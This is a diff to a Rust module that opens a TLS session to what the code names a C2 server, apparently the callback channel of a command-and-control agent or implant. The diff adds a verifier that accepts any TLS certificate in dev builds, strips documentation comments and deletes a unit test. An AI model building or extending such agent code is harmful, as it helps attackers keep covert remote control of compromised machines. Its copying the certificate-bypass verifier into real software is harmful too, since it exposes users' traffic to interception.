@@ -9,7 +9,59 @@ use std::net::TcpStream;
 use std::sync::Arc;
 
 use rustls::{ClientConfig, ClientConnection, StreamOwned};
-use webpki_roots::TLS_SERVER_ROOTS;
+use rustls::client::danger::{ServerCertVerified, ServerCertVerifier, HandshakeSignatureValid};
+use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
+use rustls::DigitallySignedStruct;
+
+/// Dangerous verifier that accepts any certificate (for dev/testing only)
+#[derive(Debug)]
+struct InsecureServerCertVerifier;
+
+impl ServerCertVerifier for InsecureServerCertVerifier {
+    fn verify_server_cert(
+        &self,
+        _end_entity: &CertificateDer<'_>,
+        _intermediates: &[CertificateDer<'_>],
+        _server_name: &ServerName<'_>,
+        _ocsp_response: &[u8],
+        _now: UnixTime,
+    ) -> Result<ServerCertVerified, rustls::Error> {
+        Ok(ServerCertVerified::assertion())
+    }
+
+    fn verify_tls12_signature(
+        &self,
+        _message: &[u8],
+        _cert: &CertificateDer<'_>,
+        _dss: &DigitallySignedStruct,
+    ) -> Result<HandshakeSignatureValid, rustls::Error> {
+        Ok(HandshakeSignatureValid::assertion())
+    }
+
+    fn verify_tls13_signature(
+        &self,
+        _message: &[u8],
+        _cert: &CertificateDer<'_>,
+        _dss: &DigitallySignedStruct,
+    ) -> Result<HandshakeSignatureValid, rustls::Error> {
+        Ok(HandshakeSignatureValid::assertion())
+    }
+
+    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
+        vec![
+            rustls::SignatureScheme::RSA_PKCS1_SHA256,
+            rustls::SignatureScheme::RSA_PKCS1_SHA384,
+            rustls::SignatureScheme::RSA_PKCS1_SHA512,
+            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
+            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
+            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
+            rustls::SignatureScheme::RSA_PSS_SHA256,
+            rustls::SignatureScheme::RSA_PSS_SHA384,
+            rustls::SignatureScheme::RSA_PSS_SHA512,
+            rustls::SignatureScheme::ED25519,
+        ]
+    }
+}
 
 /// Active session with C2 server
 pub struct Session {
@@ -38,23 +90,15 @@ impl Session {
     pub fn read_line(&mut self) -> Result<String, Box<dyn Error>> {
         let mut line = String::new();
         let mut reader = BufReader::new(&mut self.stream);
-        
+
         use std::io::BufRead;
         reader.read_line(&mut line)?;
-        
+
         Ok(line)
     }
 }
 
 /// Establishes a TLS session with the C2 server
-///
-/// This reuses the same TLS configuration as the main agent
-/// for consistency and compatibility
-///
-/// # Returns
-///
-/// * `Ok(Session)` - Active encrypted session
-/// * `Err(_)` - Failed to establish session
 pub fn establish_session() -> Result<Session, Box<dyn Error>> {
     let _config = SessionConfig::default();
     let server = get_c2_server();
@@ -62,26 +106,21 @@ pub fn establish_session() -> Result<Session, Box<dyn Error>> {
     #[cfg(feature = "dev")]
     println!("[NETWORK] Establishing TLS session with {}", server);
 
-    // Parse server address
     let parts: Vec<&str> = server.split(':').collect();
     if parts.len() != 2 {
         return Err("Invalid server address format".into());
     }
-    
-    let hostname = parts[0];
-    let _port = parts[1];
 
-    // Create TLS configuration
+    let hostname = parts[0];
+
     let tls_config = create_tls_config()?;
 
-    // Connect to server
     #[cfg(feature = "dev")]
     println!("[NETWORK] Connecting to {}...", server);
-    
+
     let tcp_stream = TcpStream::connect(server)?;
     tcp_stream.set_nodelay(true)?;
 
-    // Establish TLS connection
     let server_name = rustls::pki_types::ServerName::try_from(hostname.to_string())?;
     let client_conn = ClientConnection::new(Arc::new(tls_config), server_name)?;
     let tls_stream = StreamOwned::new(client_conn, tcp_stream);
@@ -93,33 +132,29 @@ pub fn establish_session() -> Result<Session, Box<dyn Error>> {
 }
 
 /// Creates TLS client configuration
-///
-/// Uses the same configuration as the main agent:
-/// - TLS 1.2 and 1.3
-/// - System root certificates
-/// - No client certificates
+/// In dev mode: accepts any certificate (self-signed)
+/// In production: validates against root CAs
 fn create_tls_config() -> Result<ClientConfig, Box<dyn Error>> {
-    let mut root_store = rustls::RootCertStore::empty();
-    
-    // Add system root certificates
-    for cert in TLS_SERVER_ROOTS.iter() {
-        root_store.roots.push(cert.clone());
+    #[cfg(feature = "dev")]
+    {
+        // Dev mode: accept any certificate (including self-signed)
+        let config = ClientConfig::builder()
+            .dangerous()
+            .with_custom_certificate_verifier(Arc::new(InsecureServerCertVerifier))
+            .with_no_client_auth();
+        return Ok(config);
     }
 
-    let config = ClientConfig::builder()
-        .with_root_certificates(root_store)
-        .with_no_client_auth();
-
-    Ok(config)
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_create_tls_config() {
-        let config = create_tls_config();
-        assert!(config.is_ok());
+    #[cfg(not(feature = "dev"))]
+    {
+        use webpki_roots::TLS_SERVER_ROOTS;
+        let mut root_store = rustls::RootCertStore::empty();
+        for cert in TLS_SERVER_ROOTS.iter() {
+            root_store.roots.push(cert.clone());
+        }
+        let config = ClientConfig::builder()
+            .with_root_certificates(root_store)
+            .with_no_client_auth();
+        Ok(config)
     }
 }
